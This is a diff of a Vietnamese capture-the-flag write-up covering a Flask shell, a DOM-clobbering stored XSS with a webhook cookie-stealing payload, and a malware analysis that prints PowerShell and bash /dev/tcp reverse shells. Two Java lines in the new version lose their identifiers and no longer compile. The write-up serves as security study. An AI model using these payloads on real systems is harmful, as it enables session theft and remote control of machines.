@@ -48,7 +48,7 @@ Có thể thấy, server được khởi tạo ở port 80 thông qua bangdream 
 ![image](https://hackmd.io/_uploads/BJJX_MIvJe.png)
 
 Bingoo hehe
-```python=
+```python
 from flask import Flask, request, send_file, render_template
 import os
 import io
@@ -134,7 +134,9 @@ Woah mình có thể thực thi lệnh trên này, nhưng mình k biết vị tr
 
 ![image](https://hackmd.io/_uploads/rJ9YgQUv1g.png)
 okay có shell r, nâng cấp lên python shell đã
-`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 ![image](https://hackmd.io/_uploads/SylP-QUvye.png)
 
@@ -155,7 +157,7 @@ http://172.31.3.2:8000
 Đề cung cấp cho mình source code và 1 trang có chức năng tạo book với title và content, phân tích source code trước, source code có 2 file app.js và bot.js nên khả năng cao bài này sẽ là 1 bài Stored XSS.
 
 bot.js:
-```javascript=
+```javascript
 const puppeteer = require("puppeteer");
 
 const FLAG = process.env.FLAG || "TSC{fakeflag}";
@@ -194,7 +196,8 @@ module.exports = visit;
 con bot này mang cookie chứa flag, mình sẽ cần đánh cắp cookie từ con bot này.
 
 main.py:
-```python=from flask import Flask, request, render_template, redirect, url_for
+```python
+from flask import Flask, request, render_template, redirect, url_for
 import os
 import re
 import socket
@@ -268,7 +271,7 @@ Những gì mình nhập vô title và content sẽ bị mã hoá bằng base64.
 ![image](https://hackmd.io/_uploads/Hk-qNQ8PJg.png)
 
 Nhưng khi mình thử `<script>alert(1)</script>` thì lại không execute được, lý do nằm ở đâu, cùng xem qua book.html:
-```javascript=
+```javascript
             document.addEventListener("DOMContentLoaded", () => {
                 const urlParams = new URLSearchParams(window.location.search);
                 const title = atob(urlParams.get("title"));
@@ -285,7 +288,7 @@ Nhưng khi mình thử `<script>alert(1)</script>` thì lại không execute đ�
 ```
 
 Nhận vào 2 giá trị là `title` và `content`, sau đó giải mã base64 bằng hàm `atob`, sau đó sanitize bằng DOMPurify để chống XSS, vậy làm sao để bypass được và thực thi XSS thành công đây ? Mình để ý thấy dòng code sau:
-```javascript=
+```javascript
 if (typeof config !== "undefined" && config.DEBUG) {
                     document.getElementById("content").innerHTML = content;
 ```
@@ -312,7 +315,7 @@ Theo PortSwigger:
 Mình sẽ phải craft 1 payload mà payload đó ghi đè lên biến `config` trong phạm vi toàn cục, thêm thuộc tính `DEBUG`, qua đó bypass được typeof config !== "undefined" && config.DEBUG == true và execute được payload.
 
 Sau 7749 giờ nghiên cứu, mình đã tìm ra được cách inject HTML để ghi đè biến `config`:
-```javascript=
+```javascript
 <a id="config"></a><a id="config" name="DEBUG"></a>
 ```
 `<a id="config"></a>`:
@@ -335,7 +338,7 @@ Boomm, giờ craft 1 payload khác fetch đến webhook và gửi cho con bot đ
 
 và mình đã có được flag :>
 Final payload:
-```javascript=
+```javascript
 <a id="config"></a><a id="config" name="DEBUG"><img src="x" onerror="fetch('<your_webhook_site>/?cookie='+document.cookie)"></a>
 ```
 
@@ -423,13 +426,13 @@ Mình được cung cấp 2 file, 1 file class và 1 file log, mở file log lê
 Chỉ là log game thông thường thôi, không gì khả nghi cả, phân tích tiếp file Evil.class, vì đây là file chứa bytecode của 1 file java, nên phải có tool đặc biệt để decompile nó chứ k xem bằng mắt thường được, mình dùng http://www.javadecompilers.com/ để decompile.
 
 Kết quả sau khi decompile:
-```java=
+```java
 import java.util.Base64;
 
 public class Evil extends ClassLoader {
    private static final String[] $ = new String[]{"QTlXNHY2eXVpPQ==", "WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ==", "ZEhOalpYUm1MbWh2YldVPQ=="};
-   private static String ᅟ = "k9";
-   private static int ㅤ = 1017;
+   private static String = "k9";
+   private static int = 1017;
 
    private void ᅠ(byte[] var1) {
       try {
@@ -473,7 +476,7 @@ public class Evil extends ClassLoader {
 ```
 
 Tổng quan đoạn code này sẽ check xem máy đang chạy đoạn script này là attacker hay victim thông qua `var5`, nếu `var5 == true` (script đang chạy ở máy attacker), thì sẽ mở một listener và tạo ra 1 reverse shell:
-```powershell=
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient("tscctf.home",443);$stream =
 $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
 $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
@@ -484,11 +487,11 @@ System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | 
 
 Còn nếu là máy victim (var5 == false) thì sẽ connect đến cổng reverse shell đang mở trên máy attacker:
 
-``` java=
+``` java
 var10000 = new String[]{"/bin/bash", "-c", this.ㅤㅤ(new String[]{"echo", "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==", "base64", "-d", "bash"})};
 ```
 `YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==: `
-```bash=
+```bash
 bash -i >& /dev/tcp/tscctf.home/443 0>&1
 ```
 
